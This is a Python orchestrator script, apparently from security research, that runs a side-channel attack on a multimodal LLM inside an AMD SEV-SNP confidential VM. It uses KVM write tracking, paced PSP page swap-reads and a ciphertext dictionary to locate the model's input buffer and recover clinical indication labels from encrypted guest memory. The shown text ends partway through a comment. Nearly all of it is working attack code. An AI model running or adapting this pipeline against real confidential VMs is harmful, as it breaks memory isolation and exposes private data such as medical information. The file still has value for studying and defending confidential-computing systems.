#!/usr/bin/env python3
"""
case_study/llm/pipeline/master_orchestrate.py — Master Orchestrator for LLM Side-Channel Attack.

Integrates Stages 1~5 with unified CLI, stage selection, batch processing,
persistent guest stdin-loop support, safety pacing, and comprehensive analytics.

Usage:
    # 1. Single sample full execution (Stage 1~5)
    sudo python3 master_orchestrate.py --index 2

    # 2. Batch mode execution (Indices 2, 9, 12)
    sudo python3 master_orchestrate.py --indices 2,9,12

    # 3. Stage selection (e.g. Stage 3 to Stage 5 on index 2)
    python3 master_orchestrate.py --from-stage 3 --to-stage 5 --index 2

    # 4. Offline evaluation only (Stage 5 on already localized sample)
    python3 master_orchestrate.py --stage 5 --index 2
"""

import argparse
import atexit
import csv
import os
import re
import signal
import subprocess
import sys
import traceback
import threading
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple

import common as c
from stage1_prepare_dict import run_stage1
from stage2_track_blocks import block_base_gpa, score_blocks_from_log, process_tracked_log
from stage3_locate_base import locate_base_gpa, read_at_fixed
from stage4_estimate_bounds import run_stage4
from stage5_dict_match import run_stage5

RE_BASE = re.compile(r'input_ids base(?: page)? GPA:\s*0x([0-9a-f]+)', re.I)
RE_N = re.compile(r'N_image_pad:\s+(\d+)', re.I)


class GuestStdinLoop:
    """Manages a persistent guest inference process across batch samples."""

    def __init__(self, max_new_tokens: int = 60):
        self.max_new_tokens = max_new_tokens
        self.proc: Optional[subprocess.Popen] = None

    def start(self) -> None:
        cmd = (
            f"cd {c.GUEST_CWD} && sudo env HF_HUB_OFFLINE=1 TRANSFORMERS_OFFLINE=1 "
            f"{c.GUEST_PY} -u {c.GSCRIPT} --model_id Qwen/Qwen2-VL-2B-Instruct "
            f"--gpa-only --calibrate --stdin-loop"
        )
        print("[guest-loop] Launching persistent guest VLM process (can take ~45-60s)...")
        self.proc = subprocess.Popen(
            c.SSH_CMD + [cmd],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )
        ready = False
        while True:
            line = self.proc.stdout.readline()
            if not line:
                break
            print(f"  [guest] {line.strip()}")
            if "LOOP_READY" in line:
                ready = True
                break
        if not ready:
            raise RuntimeError("Guest VLM failed to reach LOOP_READY (process terminated or SSH connection failed)")
        print("[guest-loop] Guest VLM LOOP_READY confirmed.")

    def hold_sample(self, index: int, timeout: float = 180.0) -> Dict[str, Any]:
        """Send index to guest, wait until HOLDING with timeout, return GT dict."""
        if self.proc is None or self.proc.poll() is not None:
            self.start()
        self.proc.stdin.write(f"{index}\n")
        self.proc.stdin.flush()

        gt = {"base": None, "N": None, "ind": None}
        grab_ind = False
        deadline = time.time() + timeout
        while time.time() < deadline:
            l = self.proc.stdout.readline()
            if not l:
                gt["error"] = "Guest VLM stdout closed unexpectedly"
                self.close()
                return gt
            if "INDICATION (sample id" in l:
                grab_ind = True
                continue
            if grab_ind and gt["ind"] is None and l.strip() and "====" not in l:
                gt["ind"] = l.strip()
                grab_ind = False
            m = RE_BASE.search(l)
            if m:
                gt["base"] = int(m.group(1), 16)
            m = RE_N.search(l)
            if m:
                gt["N"] = int(m.group(1))
            if l.startswith("LOOP_ERR"):
                gt["error"] = l.strip()
                return gt
            if "HOLDING" in l:
                return gt
        gt["error"] = f"Guest VLM inference timeout (>{timeout}s)"
        print(f"  [!] {gt['error']}. Resetting guest VLM loop...")
        self.close()
        return gt

    def release_sample(self) -> None:
        """Send NEXT to guest to release held buffer."""
        if self.proc and self.proc.poll() is None:
            self.proc.stdin.write("NEXT\n")
            self.proc.stdin.flush()
            for l in self.proc.stdout:
                if "RELEASED" in l:
                    break

    def close(self) -> None:
        if self.proc and self.proc.poll() is None:
            try:
                self.proc.stdin.write("QUIT\n")
                self.proc.stdin.flush()
                self.proc.wait(timeout=10)
            except Exception:
                self.proc.kill()
        self.proc = None


# Per-sample write tracker (armed only during a sample's inference). Held in a
# module global so an abnormal exit (SIGTERM / uncaught error) can still SIGTERM
# it cleanly — a tracker killed with DST_TRACK still armed write-protects the
# whole guest and wedges it until something disables it.
_ACTIVE_TRACKER: Optional[Tuple[subprocess.Popen, Any]] = None

# Bounded lifetime so an ORPHANED tracker (master crashed mid-sample)
# self-terminates and runs KVM_DST_TRACK_DISABLE on its own deadline instead of
# wedging the guest for the full 10h. One inference under tracking is minutes.
_TRACKER_DURATION_S = 1200


def _start_tracker(tracker_log_path: Path) -> Tuple[subprocess.Popen, Any]:
    """Arm KVM_DST_TRACK write tracking (fresh log) and wait out the settle.

    The tracker write-protects the whole guest GPA range to catch writes, so it
    must run ONLY during a sample's inference (Stage 2) and be stopped before any
    swap-read — see _stop_tracker. Returns (proc, open log file)."""
    global _ACTIVE_TRACKER
    log_file = open(tracker_log_path, "w", encoding="utf-8")
    proc = subprocess.Popen(
        [c.TRACKER_BIN, "--start-gpa", hex(c.TRACK_START),
         "--track-size", hex(c.TRACK_SIZE),
         "--duration", str(_TRACKER_DURATION_S), "--settle", str(c.TRACKER_SETTLE_S),
         "--rearm-ms", str(c.TRACKER_REARM_MS)],
        stdout=log_file, stderr=subprocess.PIPE, text=True
    )
    _ACTIVE_TRACKER = (proc, log_file)
    deadline = time.time() + c.TRACKER_SETTLE_S + 10
    while time.time() < deadline:
        line = proc.stderr.readline()
        if not line or "Settle done" in line:
            break
    threading.Thread(target=lambda: [None for _ in proc.stderr], daemon=True).start()
    return proc, log_file


def _stop_tracker(proc: Optional[subprocess.Popen], log_file: Optional[Any]) -> None:
    """SIGTERM the tracker so it runs KVM_DST_TRACK_DISABLE on exit, releasing the
    guest to full speed for the PSP swap-read phase. Then close the log. Avoid
    SIGKILL: that skips DISABLE and leaves the guest write-protected."""
    global _ACTIVE_TRACKER
    if proc and proc.poll() is None:
        proc.terminate()
        try:
            proc.wait(timeout=20)
        except Exception:
            # Last resort; leaks DST_TRACK, but the next _start_tracker's startup
            # DISABLE and the bounded --duration will clear it.
            proc.kill()
    if log_file:
        try:
            log_file.flush()
            log_file.close()
        except Exception:
            pass
    _ACTIVE_TRACKER = None


def _cleanup_active_tracker() -> None:
    """atexit / signal hook: cleanly stop a still-armed tracker on any exit."""
    if _ACTIVE_TRACKER is not None:
        try:
            _stop_tracker(*_ACTIVE_TRACKER)
        except Exception:
            pass


def _sig_terminate(signum, frame):
    # Turn SIGTERM/SIGINT into SystemExit so finally/atexit run (default SIGTERM
    # kills us without disarming the tracker).
    raise SystemExit(128 + signum)


def update_anchor(host_base: Optional[int], recency_list: List[int],
                  known_blocks: Dict[int, int], loc_state: Dict[str, int],
                  blind: bool) -> Optional[str]:
    """Update the Stage 2 arena anchor (recency_list[0]) after one sample's
    localization. Returns a reason clause when the anchor was dropped.

    The anchor drives a 10x Stage 2 score boost within 8MB of it, so it must
    only ever come from a CONFIRMED hit:
     - seeding it with the block we just failed on (the original code) boosts
       the wrong region and one miss poisons every later sample (measured:
       median rank 52, localization 6.8%);
     - seeding it once on cold start and keeping it (the next attempt) sticks
       forever when the seed is wrong -- after the guest worker restarted at
       sample 40 localization went 0/40.
    So a miss never writes the anchor. After BLIND_ANCHOR_RESET_MISSES
    consecutive misses it is treated as stale (the arena drifts ~1MB/sample and
    jumps on a worker restart) and dropped. Blind Stage 3 now ranks blocks with
    the anchor-free time-windowed run*hit (Phase KW); the anchor only affects
    the Phase KB fallback.
    """
    note = None
    if host_base:
        blk = host_base & ~(c.BLOCK_SIZE - 1)
        known_blocks[blk] = (host_base - blk) // c.PAGE_SIZE
        if blk in recency_list:
            recency_list.remove(blk)
        recency_list.insert(0, blk)
        loc_state["miss_streak"] = 0
    else:
        loc_state["miss_streak"] = loc_state.get("miss_streak", 0) + 1
        if blind and recency_list and loc_state["miss_streak"] >= c.BLIND_ANCHOR_RESET_MISSES:
            note = f"anchor dropped after {loc_state['miss_streak']} consecutive misses"
            recency_list.clear()
    # Bounded, and IN PLACE: rebinding the name (recency_list = recency_list[:3])
    # leaves the caller's list untouched, so it used to grow without bound.
    if len(recency_list) > 3:
        del recency_list[3:]
    return note


def run_pipeline_for_sample(
    index: int,
    from_stage: int,
    to_stage: int,
    pacer: c.Pacer,
    guest_loop: Optional[GuestStdinLoop],
    fixed_gpa: Optional[int],
    ip_ref: Optional[bytes],
    ip_mask: Optional[Set[int]],
    known_blocks: Dict[int, int],
    recency_list: List[int],
    dict_cache: Optional[Dict[str, Any]],
    output_dir: Path,
    blind: bool = False,
    loc_state: Optional[Dict[str, int]] = None,
) -> Dict[str, Any]:
    """Execute stages [from_stage, to_stage] for a single sample index."""
    if loc_state is None:
        loc_state = {"miss_streak": 0}
    t_start = time.time()
    sample_res: Dict[str, Any] = {"index": index}

    print("\n" + "=" * 75)
    print(f"  [ORCHESTRATE] Processing Sample Index: {index} (Stages {from_stage} -> {to_stage})")
    print("=" * 75)

    gt: Dict[str, Any] = {"base": None, "N": None, "ind": None}

    # Per-stage wall clock and a human-readable account of how this sample
    # ended, both persisted per row so the batch can be analysed afterwards
    # without re-reading the run log.
    t_stage: Dict[str, Optional[float]] = {"t_stage2": None, "t_stage3": None,
                                           "t_stage4": None, "t_stage5": None}
    reasons: List[str] = []

    # -----------------------------------------------------------------------
    # Stage 1: Preparation (already done or run if requested)
    # -----------------------------------------------------------------------
    if from_stage <= 1 <= to_stage:
        # Never rebuilds here: the dictionary is rebuilt once per batch in
        # main() under --build-dict, because it is per-boot, not per-sample.
        run_stage1(build_dict=False, skip_existing=True, output_dir=output_dir)

    # -----------------------------------------------------------------------
    # Stage 2: Write Pattern Tracking
    # -----------------------------------------------------------------------
    st2_path = output_dir / f"stage2_tracked_{index}.json"
    _t0_s2 = time.time()
    if from_stage <= 2 <= to_stage:
        if guest_loop is not None:
            # Online mode. Track writes ONLY during this sample's inference
            # (the Stage 2 observation window), then stop tracking BEFORE the
            # Stage 3 swap-reads. KVM_DST_TRACK write-protects the entire guest
            # range, so leaving it armed throttles the guest to a crawl during
            # the PSP page swaps (~1M swap-status poll iters/swap vs ~75k
            # untracked). Tracking (find the input) and swapping (read it) are
            # sequential, never concurrent.
            print(f"  [Stage 2] Triggering guest inference & holding buffer for index {index}...")
            tracker_log_path = output_dir / f"sample_{index}_wpt.log"
            tp, tlf = _start_tracker(tracker_log_path)
            try:
                gt = guest_loop.hold_sample(index)
            finally:
                # Release DST_TRACK before any swap-read, even on guest error.
                _stop_tracker(tp, tlf)

            if gt.get("error"):
                print(f"  [!] Guest error on index {index}: {gt['error']}")
                return {"index": index, "verdict": "GEN_FAIL", "error": gt["error"],
                        "t_stage2": round(time.time() - _t0_s2, 1),
                        "elapsed_sec": round(time.time() - t_start, 1),
                        "reason": f"stage2: guest inference never reported a buffer "
                                  f"({gt['error']}); no ground truth, nothing to localize"}

            active_anchor = recency_list[0] if recency_list else None
            st2_res = process_tracked_log(index, str(tracker_log_path), gt, top_k=c.N_TRACKER_CANDIDATES, out_dir=output_dir, start_offset=0, active_arena_anchor=active_anchor)
        else:
            # Check if offline host log exists or run standalone
            from stage2_track_blocks import run_stage2_online
            active_anchor = recency_list[0] if recency_list else None
            st2_res = run_stage2_online(index, top_k=c.N_TRACKER_CANDIDATES, output_dir=output_dir, active_arena_anchor=active_anchor)
            gt = {"base": int(st2_res["gt_base"], 16) if st2_res.get("gt_base") else None,
                  "ind": st2_res.get("gt_indication"),
                  "N": st2_res.get("gt_N")}
    elif st2_path.exists():
        st2_res = c.load_json(st2_path)
        gt = {"base": int(st2_res["gt_base"], 16) if st2_res.get("gt_base") else None,
              "ind": st2_res.get("gt_indication"),
              "N": st2_res.get("gt_N")}
    else:
        st2_res = {}

    if from_stage <= 2 <= to_stage:
        t_stage["t_stage2"] = round(time.time() - _t0_s2, 1)

    cand_blks = [int(x, 16) for x in st2_res.get("candidate_blocks", [])]
    cand_run_bases = st2_res.get("candidate_run_bases", {})
    cand_runs = st2_res.get("candidate_runs", {})
    cand_page_ts = st2_res.get("candidate_page_ts", {})

    # Where Stage 2's own ranking put the true block. This is the single most
    # useful diagnostic for a localization miss: a blind scan can only reach
    # the first few ranks within the swap budget, so rank >> budget explains
    # the miss without any further investigation.
    # Blind Stage 3 walks the time-windowed run*hit ranking (Phase KW), so that is
    # the rank that explains a blind miss; the whole-window score rank does not.
    use_window_rank = blind and "gt_window_rank" in st2_res
    gt_block_rank = st2_res.get("gt_window_rank") if use_window_rank else st2_res.get("gt_rank")
    rank_label = "window run*hit" if use_window_rank else "block score"
    n_scored_blocks = st2_res.get("total_scored_blocks")
    if gt_block_rank:
        reasons.append(f"stage2: true block ranked #{gt_block_rank} by {rank_label}"
                       f"{f' of {n_scored_blocks}' if n_scored_blocks else ''}")
    elif st2_res:
        reasons.append("stage2: true block absent from the candidate ranking")

    # -----------------------------------------------------------------------
    # Stage 3: Sharp Localization (Base GPA)
    # -----------------------------------------------------------------------
    host_base = None
    loc_strategy = "N/A"
    loc_swaps = 0
    best_hits = None
    st3_path = output_dir / f"stage3_located_{index}.json"
    _t0_s3 = time.time()

    if from_stage <= 3 <= to_stage:
        if fixed_gpa is not None and ip_ref is not None and ip_mask is not None:
            # DIAGNOSTIC: directly swap-read the guest-reported gt_base and count
            # image_pad hits. Isolates the two failure modes — if this MATCHES,
            # the swap+ip_ref path is fine and only blind localization (ranking/
            # search) is failing; if this is 0, the swap-read/matching itself is
            # broken (deeper bug), so no localization can work.
            if gt.get("base"):
                try:
                    gt_pg = gt["base"] & ~(c.PAGE_SIZE - 1)
                    # Pace it like any other swap. This is real PSP traffic; if
                    # it skips the pacer it runs outside the rate limiter and
                    # outside MAX_TOTAL_SWAPS_RUN, which is exactly the swap
                    # burst pattern that has wedged QEMU before. It stays out
                    # of loc_swaps on purpose -- that column must report the
                    # attack's cost, not the diagnostic's.
                    pacer.tick()
                    _d = read_at_fixed(fixed_gpa, gt_pg, "gt_direct")
                    _h = sum(1 for j in ip_mask if c.get_chunk(_d, j) == c.get_chunk(ip_ref, j))
                    print(f"  [gt-direct] swap-read gt_base 0x{gt_pg:x}: image_pad hits="
                          f"{_h}/{len(ip_mask)}  {'MATCH' if _h >= c.IMAGE_PAD_MATCH_MIN else 'NO-MATCH'}")
                except Exception as _e:
                    print(f"  [gt-direct] failed: {_e}")

            bootstrap = None if blind else ((gt["base"] & ~(c.BLOCK_SIZE - 1)) if gt.get("base") else None)
            host_base, loc_swaps, loc_strategy, best_hits = locate_base_gpa(
                fixed_gpa=fixed_gpa,
                ip_ref=ip_ref,
                ip_mask=ip_mask,
                tracker_candidates=cand_blks,
                known_blocks=known_blocks,
                recency_list=recency_list,
                pacer=pacer,
                candidate_run_bases=cand_run_bases,
                candidate_runs=cand_runs,
                candidate_page_ts=cand_page_ts,
                bootstrap_block=bootstrap,
                blind=blind,
                window_candidates=st2_res.get("window_candidates"),
            )
            loc_match = c.loc_is_hit(host_base, gt.get("base")) if (host_base and gt.get("base")) else None
            # Exact-page delta alongside loc_match: loc_match allows +-
            # LOC_MATCH_PAGE_WINDOW pages (the input_ids buffer spans several
            # pages, so the image_pad page we land on is legitimately not always
            # gt_base's page). Recording the delta lets the final numbers report
            # exact-page rate and windowed rate separately.
            page_delta = (((host_base & ~(c.PAGE_SIZE - 1)) - (gt["base"] & ~(c.PAGE_SIZE - 1)))
                          // c.PAGE_SIZE) if (host_base and gt.get("base")) else None
            st3_res = {
                "index": index,
                "host_base": hex(host_base) if host_base else None,
                "loc_strategy": loc_strategy,
                "loc_swaps": loc_swaps,
                "best_hits": best_hits,
                "loc_match": loc_match,
                "page_delta": page_delta,
                "blind": blind,
                "gt_base": hex(gt["base"]) if gt.get("base") else None,
                "gt_indication": gt.get("ind"),
                "status": "SUCCESS" if host_base else "LOC_FAIL",
                "timestamp": time.time(),
            }
            c.save_json(st3_path, st3_res)
        else:
            from stage3_locate_base import run_stage3
            st3_res = run_stage3(index, stage2_json=st2_path, output_dir=output_dir, blind=blind)
            host_base = int(st3_res["host_base"], 16) if st3_res.get("host_base") else None
            loc_strategy = st3_res.get("loc_strategy", "N/A")
            loc_swaps = st3_res.get("loc_swaps", 0)
            best_hits = st3_res.get("best_hits")
    elif st3_path.exists():
        st3_res = c.load_json(st3_path)
        host_base = int(st3_res["host_base"], 16) if st3_res.get("host_base") else None
        loc_strategy = st3_res.get("loc_strategy", "N/A")
        loc_swaps = st3_res.get("loc_swaps", 0)
        best_hits = st3_res.get("best_hits")
    else:
        st3_res = {}

    if from_stage <= 3 <= to_stage:
        t_stage["t_stage3"] = round(time.time() - _t0_s3, 1)
        _min_match = max(c.IMAGE_PAD_MATCH_MIN,
                         int(len(ip_mask) * 0.35)) if ip_mask else c.IMAGE_PAD_MATCH_MIN
        if host_base:
            _lm = c.loc_is_hit(host_base, gt.get("base")) if gt.get("base") else None
            reasons.append(
                f"stage3: confirmed page 0x{host_base:x} via {loc_strategy} after "
                f"{loc_swaps} swap-read(s), image_pad {best_hits}/{len(ip_mask) if ip_mask else '?'} "
                f">= {_min_match}" + ("" if _lm else
                " BUT outside the +-{}p window around the true base (false confirm)".format(
                    c.LOC_MATCH_PAGE_WINDOW)))
        elif loc_swaps >= c.MAX_LOC_SWAPS_SAMPLE:
            # How deep the budget reaches: Phase KW probes up to
            # BLIND_WINDOW_PAGES_PER_BLOCK pages per block.
            _reach_blocks = (c.MAX_LOC_SWAPS_SAMPLE // max(c.BLIND_WINDOW_PAGES_PER_BLOCK, 1)
                             if use_window_rank else 5)
            reasons.append(
                f"stage3: swap budget exhausted ({loc_swaps}/{c.MAX_LOC_SWAPS_SAMPLE}) "
                f"with no page reaching the image_pad threshold; best was "
                f"{best_hits}/{len(ip_mask) if ip_mask else '?'} < {_min_match}"
                + (f" — true block was only rank #{gt_block_rank}, too deep to reach"
                   if gt_block_rank and gt_block_rank > _reach_blocks else ""))
        else:
            reasons.append(
                f"stage3: no page matched after {loc_swaps} swap-read(s) "
                f"(budget not exhausted); best image_pad "
                f"{best_hits}/{len(ip_mask) if ip_mask else '?'} < {_min_match}")

    _anchor_note = update_anchor(host_base, recency_list, known_blocks, loc_state, blind)
    if _anchor_note:
        reasons.append(_anchor_note)

    # -----------------------------------------------------------------------
    # Stage 4: Pad Boundary & Indication Window Search
    # -----------------------------------------------------------------------
    st4_path = output_dir / f"stage4_bounds_{index}.json"
    n_pad_est = None
    _t0_s4 = time.time()
    if from_stage <= 4 <= to_stage:
        if host_base:
            st4_res = run_stage4(index, base_gpa=host_base, output_dir=output_dir)
            n_pad_est = st4_res.get("N_est")
            t_stage["t_stage4"] = round(time.time() - _t0_s4, 1)
            if st4_res.get("status") == "SUCCESS":
                reasons.append(f"stage4: pad_start={st4_res.get('pad_start')} "
                               f"N_est={n_pad_est}, indication window "
                               f"[{st4_res.get('tok_min')},{st4_res.get('tok_max')}]")
            else:
                reasons.append(f"stage4: {st4_res.get('status')} — pad bounds not "
                               f"established, so Stage 5 has to fall back to its own "
                               f"binary search and worst-case window")
        else:
            st4_res = {"status": "SKIPPED_LOC_FAIL"}
            reasons.append("stage4: skipped, no located page")
    elif st4_path.exists():
        st4_res = c.load_json(st4_path)
        n_pad_est = st4_res.get("N_est")
    else:
        st4_res = {}

    # -----------------------------------------------------------------------
    # Stage 5: Dictionary Matching & Label Recovery
    # -----------------------------------------------------------------------
    st5_path = output_dir / f"stage5_result_{index}.json"
    recovered_labels: List[str] = []
    eval_result: Dict[str, Any] = {}

    _t0_s5 = time.time()
    if from_stage <= 5 <= to_stage:
        if host_base:
            st5_res = run_stage5(index, stage4_json=st4_path, base_gpa=host_base,
                                 output_dir=output_dir, gt_indication=gt.get("ind"))
            recovered_labels = st5_res.get("recovered_labels", [])
            eval_result = st5_res.get("evaluation", {})
            t_stage["t_stage5"] = round(time.time() - _t0_s5, 1)
            _v = eval_result.get("verdict")
            _fp = eval_result.get("false_positive_count", 0)
            _mm = eval_result.get("multi_match_count", 0)
            if eval_result.get("top1_exact_match"):
                reasons.append(f"stage5: top-1 label matches the true indication "
                               f"({_mm} match(es) total)")
            elif eval_result.get("any_label_match"):
                reasons.append(f"stage5: a correct label recovered but not ranked first "
                               f"({_mm} matches, {_fp} false positive(s))")
            elif _mm:
                reasons.append(f"stage5: {_mm} label(s) matched but none belong to the "
                               f"true indication — aliasing in the guessed indication "
                               f"window (MIN_CLEAN_AES_BLOCKS=1 lets a single 16B block "
                               f"match unrelated ciphertext)")
            else:
                reasons.append(f"stage5: no label matched anywhere in the indication "
                               f"window (verdict={_v})")
        else:
            eval_result = c.evaluate_recovery([], gt.get("ind"))
            eval_result["verdict"] = "LOC_FAIL"
            st5_res = {"status": "LOC_FAIL", "evaluation": eval_result}
            c.save_json(st5_path, st5_res)
            reasons.append("stage5: skipped, no located page")
    elif st5_path.exists():
        st5_res = c.load_json(st5_path)
        recovered_labels = st5_res.get("recovered_labels", [])
        eval_result = st5_res.get("evaluation", {})
    else:
        st5_res = {}

    # Release guest buffer after scan completes
    if guest_loop is not None:
        guest_loop.release_sample()

    elapsed = time.time() - t_start

    sample_summary = {
        "index": index,
        "indication": gt.get("ind") or "",
        "gt_base": hex(gt["base"]) if gt.get("base") else "",
        "host_base": hex(host_base) if host_base else "",
        "loc_strategy": loc_strategy,
        "loc_swaps": loc_swaps,
        "loc_match": c.loc_is_hit(host_base, gt.get("base")) if (host_base and gt.get("base")) else False,
        "page_delta": (((host_base & ~(c.PAGE_SIZE - 1)) - (gt["base"] & ~(c.PAGE_SIZE - 1)))
                       // c.PAGE_SIZE) if (host_base and gt.get("base")) else "",
        "blind": blind,
        "N_pad_est": n_pad_est or "",
        "verdict": eval_result.get("verdict", ("LOC_SUCCESS" if (host_base and gt.get("base") and c.loc_is_hit(host_base, gt.get("base"))) else ("LOC_MISMATCH" if host_base else "LOC_FAIL")) if to_stage < 5 else "NO_MATCH"),
        "recovered_labels": " / ".join(recovered_labels),
        "top1_match": eval_result.get("top1_exact_match", False),
        "any_match": eval_result.get("any_label_match", False),
        "multi_match_count": eval_result.get("multi_match_count", 0),
        "false_positive_count": eval_result.get("false_positive_count", 0),
        "false_positive_labels": " / ".join(eval_result.get("false_positive_labels", [])),
        "t_stage2": t_stage["t_stage2"] if t_stage["t_stage2"] is not None else "",
        "t_stage3": t_stage["t_stage3"] if t_stage["t_stage3"] is not None else "",
        "t_stage4": t_stage["t_stage4"] if t_stage["t_stage4"] is not None else "",
        "t_stage5": t_stage["t_stage5"] if t_stage["t_stage5"] is not None else "",
        "elapsed_sec": round(elapsed, 1),
        "gt_block_rank": gt_block_rank if gt_block_rank else "",
        "loc_best_hits": best_hits if best_hits is not None else "",
        "reason": " | ".join(reasons),
    }

    print(f"  [why] {sample_summary['reason']}")
    print(f"  [time] stage2={t_stage['t_stage2']}s stage3={t_stage['t_stage3']}s "
          f"stage4={t_stage['t_stage4']}s stage5={t_stage['t_stage5']}s "
          f"total={round(elapsed, 1)}s")

    return sample_summary


def main():
    # Ensure the write tracker is always disarmed on exit (normal, error, or
    # SIGTERM/SIGINT) so an interrupted run never leaves the guest wedged.
    atexit.register(_cleanup_active_tracker)
    signal.signal(signal.SIGTERM, _sig_terminate)
    signal.signal(signal.SIGINT, _sig_terminate)

    p = argparse.ArgumentParser(description="Master Orchestrator for LLM Side-Channel Attack Pipeline")
    p.add_argument("--index", type=int, default=None, help="Single sample index")
    p.add_argument("--indices", type=str, default=None, help="Comma-separated sample indices (e.g. 2,9,12)")
    p.add_argument("--start", type=int, default=None, help="Start sample index for batch range")
    p.add_argument("--end", type=int, default=None, help="End sample index (inclusive) for batch range")
    p.add_argument("--filtered-only", action="store_true", help="Run only samples containing clinical target indications (from filtered_samples.json)")
    p.add_argument("--all", action="store_true", help="Run entire test dataset (0..3462)")
    p.add_argument("--limit", type=int, default=None, help="Limit number of samples to process in this run")
    p.add_argument("--stage", type=int, default=None, help="Run only a single specific stage (1..5)")
    p.add_argument("--from-stage", type=int, default=1, help="Start from stage (1..5)")
    p.add_argument("--to-stage", type=int, default=5, help="End at stage (1..5)")
    p.add_argument("--max-new-tokens", type=int, default=60, help="Max tokens for guest generation")
    p.add_argument("--output-dir", type=Path, default=c.PIPELINE_DIR, help="Output directory")
    p.add_argument("--force-rerun", action="store_true", default=False, help="Force rerun even if sample already completed in summary CSV")
    p.add_argument("--blind", action="store_true", help="Withhold the ground-truth block from Stage 3 (measure true blind localization accuracy, no GT leakage)")
    p.add_argument("--build-dict", action="store_true",
                   help="Rebuild the ciphertext dictionary once, at the start of this "
                        "batch, before the guest VLM loop comes up (~4 min). REQUIRED "
                        "whenever Stage 5 runs: the SNP VEK is generated per VM launch, "
                        "so a dictionary captured in an earlier boot cannot match this "
                        "guest's ciphertext and Stage 5 silently returns only false "
                        "positives. Not needed for a Stage 1-3 (localization) run, which "
                        "uses the per-batch ICMP image_pad reference instead.")
    p.add_argument("--track-size", type=str, default=None, help="Write tracker window size (e.g. 0x800000000 for 32GB)")
    p.add_argument("--fast", action="store_true", help="Tighter localization pacing/budget for a quicker run (pushes PSP command rate higher — see common.SC_* knobs)")
    args = p.parse_args()

    if args.track_size:
        c.TRACK_SIZE = int(args.track_size, 16) if args.track_size.startswith("0x") else int(args.track_size)
        print(f"[orchestrator] Custom tracking size set: 0x{c.TRACK_SIZE:x} ({c.TRACK_SIZE // (1024**3)} GB)")

    if args.fast:
        # Reassign the live module constants (Pacer/scan read them by reference).
        # Still bounded well under the ~60 PSP-cmd/s reset threshold, but tighter.
        c.SWAP_PACE_SEC = min(c.SWAP_PACE_SEC, 0.15)
        c.INTER_TRY_SETTLE_SEC = min(c.INTER_TRY_SETTLE_SEC, 0.5)
        c.SWAP_BURST_SLEEP = min(c.SWAP_BURST_SLEEP, 1.0)
        # NOTE: --fast no longer caps N_TRACKER_CANDIDATES — probing more candidate
        # blocks is the biggest localization-accuracy lever and swaps are cheap now
        # that the tracker is off during Stage 3.
        print(f"[orchestrator] FAST profile: pace={c.SWAP_PACE_SEC}s settle={c.INTER_TRY_SETTLE_SEC}s "
              f"burst_sleep={c.SWAP_BURST_SLEEP}s tracker_cand={c.N_TRACKER_CANDIDATES} max_loc_swaps={c.MAX_LOC_SWAPS_SAMPLE}")

    # Determine indices list
    if args.indices:
        indices = [int(x.strip()) for x in args.indices.split(",")]
    elif args.filtered_only:
        filt_path = c.LLM_DIR / "filtered_samples.json"
        if filt_path.exists():
            filt_data = c.load_json(filt_path)
            indices = [int(s.get("sample_idx", s.get("index", i))) for i, s in enumerate(filt_data)]
        else:
            indices = list(range(0, 3463))
    elif args.all:
        indices = list(range(0, 3463))
    elif args.start is not None and args.end is not None:
        indices = list(range(args.start, args.end + 1))
    elif args.index is not None:
        indices = [args.index]
    else:
        indices = [2]

    if args.limit:
        indices = indices[:args.limit]

    from_st = args.stage if args.stage is not None else args.from_stage
    to_st = args.stage if args.stage is not None else args.to_stage

    out_dir = args.output_dir
    out_dir.mkdir(parents=True, exist_ok=True)
    summary_csv = out_dir / "pipeline_summary.csv"
    c.init_summary_csv(summary_csv)

    existing_summary = c.load_summary_csv(summary_csv)
    if not args.force_rerun and len(indices) > 1:
        completed_indices = set(existing_summary.keys())
        remaining_indices = [idx for idx in indices if idx not in completed_indices]
        if len(remaining_indices) < len(indices):
            print(f"[orchestrator] Found {len(indices) - len(remaining_indices)} already completed samples in summary CSV.")
            print(f"[orchestrator] Resuming with {len(remaining_indices)} remaining samples (next: {remaining_indices[:5]}...)")
            indices = remaining_indices

    if not indices:
        print(f"[orchestrator] All {len(existing_summary)} target samples are already completed in {summary_csv}. Nothing to do.")
        return

    print("=" * 75)
    print("  LLM END-TO-END MODULAR ATTACK ORCHESTRATOR")
    print("=" * 75)
    print(f"  Target Sample Count: {len(indices)} (e.g. {indices[:10]}{'...' if len(indices)>10 else ''})")
    print(f"  Active Stages      : Stage {from_st} -> Stage {to_st}")
    print(f"  Localization Mode  : {'BLIND (no GT leakage)' if args.blind else 'GT-assisted (bootstrap fallback ON)'}")
    print(f"  Output Directory   : {out_dir}")
    print("=" * 75)

    # Initialize shared components
    pacer = c.Pacer()
    known_blocks: Dict[int, int] = {}
    recency_list: List[int] = []
    loc_state: Dict[str, int] = {"miss_streak": 0}

    dict_cache = None
    if c.DICT_CACHE.exists():
        dict_cache = c.load_json(c.DICT_CACHE)

    # Preflight network if running online stages
    if from_st <= 3:
        c.run_net_preflight()
        c.ensure_mtu_9000()

    guest_loop = None
    tracker_proc = None
    tracker_log_file = None
    fixed_gpa = None
    ip_ref = None
    ip_mask = None

    # If running online stages (1..3) and multiple indices, setup guest loop and references
    if from_st <= 2:
        try:
            # ---------------------------------------------------------------
            # Step A: ICMP calibration FIRST, on a QUIESCENT guest.
            # acquire_gpa (FIXED_GPA) and the Image-Pad reference are one-time
            # calibration; they need neither the VLM loop nor the write
            # tracker. Both of those saturate / single-step the 1-vCPU guest,
            # which stretches the guest's mdelay(6000) ICMP hold past the 7s
            # _wait_icmp_hold window and makes the second frag probe read empty
            # -> spurious "hook not firing" and slow escalating retries. So we
            # calibrate before bringing either of them up. (drain first to
            # clear net_preflight's 8192B ping backlog.)
            # ---------------------------------------------------------------
            from mura_dict_build import acquire_gpa, drain_rxbuf
            from stage1_prepare_dict import acquire_imagepad_reference
            drain_rxbuf(rounds=3)
            fixed_gpa = acquire_gpa(None)
            ip_ref, ip_mask = acquire_imagepad_reference(fixed_gpa)
            print(f"[orchestrator] Image-Pad reference ready: {len(ip_mask)}/256 confirmed offsets")

            # ---------------------------------------------------------------
            # Step A2: rebuild the ciphertext dictionary for THIS boot, ONCE
            # per batch. The SNP VEK is generated by the PSP at each VM
            # launch, so ciphertext for the same plaintext at the same
            # physical address differs across boots: a dictionary captured in
            # an earlier boot matches nothing and makes Stage 5 report pure
            # false positives with no error. Built here, on the still-
            # quiescent guest and before the VLM loop, for the same reason
